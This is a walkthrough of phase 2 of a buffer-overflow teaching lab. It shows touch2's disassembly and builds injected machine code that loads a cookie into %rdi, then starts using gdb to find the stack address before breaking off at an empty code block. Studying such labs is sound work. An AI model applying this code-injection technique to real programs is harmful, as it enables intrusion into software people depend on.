# PHASE 2

Phase 2 involves injecting a small code and calling function touch2 while making it look like you passed the cookie as an argument to touch2

If you look inside the ```rtarget_dump.s``` fil and search for touch2, it looks something like this:
```assembly
0000000000401945 <touch2>:
  401945:       48 83 ec 08             sub    $0x8,%rsp
  401949:       89 fa                   mov    %edi,%edx
  40194b:       c7 05 c7 3b 20 00 02    movl   $0x2,0x203bc7(%rip)        # 60551c <vlevel>
  401952:       00 00 00 
  401955:       39 3d c9 3b 20 00       cmp    %edi,0x203bc9(%rip)        # 605524 <cookie>
  40195b:       75 20                   jne    40197d <touch2+0x38>
  40195d:       be d0 34 40 00          mov    $0x4034d0,%esi
  401962:       bf 01 00 00 00          mov    $0x1,%edi
  401967:       b8 00 00 00 00          mov    $0x0,%eax
  40196c:       e8 8f f4 ff ff          callq  400e00 <__printf_chk@plt>
  401971:       bf 02 00 00 00          mov    $0x2,%edi
  401976:       e8 77 05 00 00          callq  401ef2 <validate>
  40197b:       eb 1e                   jmp    40199b <touch2+0x56>
  40197d:       be f8 34 40 00          mov    $0x4034f8,%esi
  401982:       bf 01 00 00 00          mov    $0x1,%edi
  401987:       b8 00 00 00 00          mov    $0x0,%eax
  40198c:       e8 6f f4 ff ff          callq  400e00 <__printf_chk@plt>
  401991:       bf 02 00 00 00          mov    $0x2,%edi
  401996:       e8 33 06 00 00          callq  401fce <fail>
  40199b:       bf 00 00 00 00          mov    $0x0,%edi
  4019a0:       e8 ab f4 ff ff          callq  400e50 <exit@plt>
  ```
If you read the instruction pdf, it says, "Recall that the first argument to a function is passed in register %rdi."

So our goal is to modify the %rdi register and store our cookie in there.

So you have to write some assembly code for that task, create a file called ```phase2.s``` and write the below code, replacing the cookie with yours from the previous phase.
```assembly
  movq $0x3451d86d,%rdi /* move your cookie to register %rdi */
  retq                  /* return */
```
Now you need the byte representation of the code you wrote above, compile it with gcc then dissasemble it.

```ssh
gcc -c phase2.s
objdump -d phase2.o  > phase2.d 
```
Now open the file phase2.d and you will get something like below

```ssh
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 6d d8 51 34 	mov    $0x3451d86d,%rdi
   7:	c3                   	retq   
```
The byte representation of the assembly code is ```48 c7 c7 6d d8 51 34 c3```.

Now we need to find the address of rsp register:

Run ctarget through gdb
```gdb ctarget```

set a breakpoint at getbuf
```b getbuf```

run ctarget
```r```

Dissasemble it
```disas```

You will get something like below:
```

```
